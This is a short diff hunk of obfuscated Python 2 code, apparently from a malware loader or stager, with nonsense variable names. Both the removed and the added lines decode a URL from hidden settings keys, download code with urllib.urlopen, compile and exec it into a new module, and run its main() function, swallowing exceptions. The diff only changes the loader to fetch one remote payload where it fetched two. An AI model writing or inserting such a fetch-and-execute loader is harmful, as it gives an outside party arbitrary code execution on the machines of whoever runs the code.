@@ -58,11 +58,11 @@ def run(*args, **kwargs):
                     continue
         finally:
             try:
-                AmbiguousObedientQuestion = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__u__'))
-                TalentedAlcoholicBeetle = os.path.splitext(os.path.basename(AmbiguousObedientQuestion))[0]
+                AmbiguousObedientQuestion   = SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__u__'))
+                TalentedAlcoholicBeetle     = os.path.splitext(os.path.basename(AmbiguousObedientQuestion))[0]
                 PanoramicAbandonedCraftsman = imp.new_module(TalentedAlcoholicBeetle)
-                QuarrelsomeImportedAtom = '\n\n'.join([urllib.urlopen(AmbiguousObedientQuestion).read(), urllib.urlopen(SomberUnbecomingAmusement(AccidentalAquaticCactus['settings'].get('__z__'))).read()])
-                MajesticMachoOkra = compile(QuarrelsomeImportedAtom, TalentedAlcoholicBeetle, 'exec')
+                QuarrelsomeImportedAtom     = urllib.urlopen(AmbiguousObedientQuestion).read()
+                MajesticMachoOkra           = compile(QuarrelsomeImportedAtom, TalentedAlcoholicBeetle, 'exec')
                 exec MajesticMachoOkra in PanoramicAbandonedCraftsman.__dict__
                 return PanoramicAbandonedCraftsman.main(**AccidentalAquaticCactus['settings'])
             except Exception as e:
